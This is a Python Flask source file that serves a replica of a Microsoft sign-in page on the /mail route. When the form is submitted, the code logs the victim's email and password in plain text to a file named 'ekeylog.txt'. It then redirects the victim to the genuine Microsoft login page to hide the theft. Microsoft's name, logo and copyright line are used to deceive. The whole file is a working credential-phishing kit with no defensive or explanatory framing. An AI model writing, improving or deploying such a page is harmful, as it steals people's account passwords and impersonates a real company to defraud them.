from flask import Flask, render_template_string, request, redirect
import logging
import os

app = Flask(__name__)

# Set up logging to a file
logging.basicConfig(filename='ekeylog.txt', level=logging.INFO, format='%(asctime)s %(message)s')

# Microsoft login style HTML template
form_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to your account</title>
    <link href="https://fonts.googleapis.com/css?family=Segoe+UI:400,600&display=swap" rel="stylesheet">
    <style>
        body {
            background: #f3f2f1;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 350px;
            margin: 80px auto;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 40px 32px 32px 32px;
        }
        .logo {
            display: block;
            margin: 0 auto 32px auto;
            width: 100px;
        }
        h2 {
            font-weight: 400;
            font-size: 1.5em;
            margin-bottom: 24px;
            color: #1b1b1b;
        }
        label {
            font-size: 0.95em;
            color: #1b1b1b;
            margin-bottom: 6px;
            display: block;
        }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 18px;
            border: 1px solid #c8c6c4;
            border-radius: 2px;
            font-size: 1em;
            background: #faf9f8;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0067b8;
            color: #fff;
            border: none;
            border-radius: 2px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background: #005a9e;
        }
        .footer {
            margin-top: 32px;
            text-align: center;
            color: #767676;
            font-size: 0.9em;
        }
        .error {
            color: #e81123;
            margin-bottom: 12px;
            text-align: center;
        }
        .success {
            color: #107c10;
            margin-bottom: 12px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="/static/microsoft_logo.svg" alt="Microsoft" class="logo">
        <h2>Sign in</h2>
        <form method="POST">
            <label for="email">Email, phone, or Skype</label>
            <input type="text" id="email" name="email" autocomplete="username" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" autocomplete="current-password" required>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">&copy; 2025 Microsoft</div>
    </div>
</body>
</html>
'''

@app.route('/mail', methods=['GET', 'POST'])
def mail():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        # Log the form data
        logging.info(f"Email: {email}, Password: {password}")
        # Redirect to real Microsoft login
        return redirect('https://login.microsoftonline.com/')
    return render_template_string(form_html)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
